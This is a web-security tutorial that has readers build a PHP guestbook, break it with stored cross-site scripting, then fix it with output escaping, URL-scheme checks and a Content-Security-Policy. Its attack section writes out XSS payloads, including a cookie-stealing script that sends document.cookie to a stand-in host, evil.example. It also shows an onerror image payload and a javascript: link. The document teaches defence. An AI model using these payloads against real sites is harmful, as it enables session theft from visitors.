Guestbook Phillip Harrington

Before comments and social media, personal sites had guestbooks: a form at the bottom where visitors left their name, their website and a line or two, and a list of everyone who'd signed. It's the simplest app there is that keeps what strangers type and shows it to other strangers, which makes it the simplest place to learn what happens when that text is HTML.

You'll build it naive, sign it with a script that runs in the browser of everyone who visits after you, then fix it the way every page that shows input has to be fixed.

What You'll Use
  • XSS and Escaping Output: the lesson this project acts out.
  • Never Trust Input: what's stored is still input when it comes back out.
  • Working with Files and JSON: one entry per line.
  • Security Headers: Content-Security-Policy.
    • Build It The Storage

    Entries go in a file, one JSON object per line, outside public. A new project folder gets a .gitignore so the entries stay out of git:

    src/Guestbook.php adds entries and reads the latest ones back:

    LOCK_EX keeps two people signing at the same moment from writing over each other. And notice what it doesn't do: it stores exactly what was typed. That's deliberate. The same text might end up in a page, an email, a CSV file or a JSON API, and each one needs different escaping. So you store the original and escape it on the way out, for wherever it's going.

    The Naive Page

    Build the naive guestbook as public/naive.php:

    docker run --rm -it -p 8000:8000 -v "$PWD":/app -w /app php:8.4-cli php -S 0.0.0.0:8000 -t public

    Open http://localhost:8000/naive.php and sign it. Your entry appears at the bottom, with your name linked to your website. It works.

    New to Docker or the terminal? Tools has the setup.

    Break It

    Sign it again, with a message that's a script:

    curl --data-urlencode "message=<script>alert('Hacked')</script>" -d 'name=Mallory' http://localhost:8000/naive.php

    A reminder: --data-urlencode posts a field like -d does, but encodes the characters that would otherwise break the form data.

    Reload the page in your browser. An alert box says "Hacked." Reload again: it says it again. The script is stored, and the page prints it into its own HTML, so it runs for every visitor, every time, until someone deletes the entry. That's stored cross-site scripting, XSS.

    An alert is the polite demonstration. The script runs as your site, with everything your site's JavaScript can do. This one would send every visitor's readable cookies to the attacker:

    <script>new Image().src = 'https://evil.example/c?' + document.cookie</script>

    It could also rewrite the page, show a fake sign-in form, or make requests to your site as the visitor. And you don't need a <script> tag at all, so blocking that word gets you nothing:

    curl --data-urlencode 'message=<img src=x onerror=alert(1)>' -d 'name=Mallory' http://localhost:8000/naive.php

    The image fails to load, and its onerror runs. One more, through the website field, which never even reaches the text of the page:

    curl --data-urlencode 'website=javascript:alert(document.cookie)' -d 'name=Click me&message=hi' http://localhost:8000/naive.php

    Now "Click me" is a link that runs a script when anyone clicks it. Never trust input, and that includes input that's been sitting in your own storage. It came from a stranger, and it's still theirs.

    Fix It

    First, two helpers in src/functions.php:

    e() escapes text for HTML. web_url() is for the one place escaping can't help: an href. javascript:alert(1) has no <, > or quotes in it, so escaping leaves it exactly as it was, and it still runs. The only fix is to check the scheme and allow http and https and nothing else.

    Then the fixed page, public/index.php:

  • Every value is escaped on the way out, with e(), in the one place it meets HTML. The message goes through nl2br() after escaping, never before, so line breaks become <br /> and nothing else does.
  • A website is only a link if it's a web address, checked when it's posted and again when it's shown, because entries already in the file never went through the first check.
  • rel="nofollow ugc" on visitors' links tells search engines the link is user-generated and not your endorsement, which takes the point out of signing your guestbook just for the link.
  • A Content-Security-Policy. default-src 'self' tells the browser to run only scripts loaded as files from your own site, and to refuse inline scripts and onerror attributes. If an escape is ever missed, the browser refuses to run what slipped through. It's the seatbelt, not the brakes: escaping is still the fix.

    • Open http://localhost:8000. It reads the very same file, every attack still in it. No alert. The script, the image and the link are all there, as plain text you can read, and "Click me" isn't a link. Try signing the fixed one with the javascript: website: "A website has to start with http:// or https://."

    Gotchas
  • Escape for where it's going. htmlspecialchars() is for HTML text and quoted attributes. Inside a <script> block, a URL, or CSS, the rules are different. Use json_encode() for a value going into JavaScript, and rawurlencode() for a piece of a URL.
  • Quote your attributes. htmlspecialchars() escapes quotes, which only protects an attribute that has quotes around it. <a href=<?= e($url) ?>>, unquoted, can be broken with a space.
  • Escaping on the way in breaks things. Store &lt;b&gt; in the file and you'll escape it again on the way out, showing visitors &amp;lt;b&amp;gt;. And the same text in an email or a CSV file comes out mangled. Store it as typed; escape it once, at the end.
  • Allowing "a little HTML" is a project of its own. If you want visitors to use bold and links, don't write your own filter. Use an HTML sanitizer library with an allow list of tags and attributes, or a simpler format like Markdown, rendered safely.
    • In October 2005, Samy Kamkar put a script in his MySpace profile that added "but most of all, samy is my hero" to the profile of anyone who viewed it, and copied itself there too. Every infected profile infected its visitors. In about a day, more than a million profiles had it, and MySpace went offline to clean up. It's still the textbook example of stored XSS spreading on its own.

    Keep one test entry on hand, <b>bold?</b> "quotes" & 'apostrophes', and paste it into every field of every form you build. If any page shows bold text, or a stray quote breaks the layout, you've found a missing escape before anyone else did.
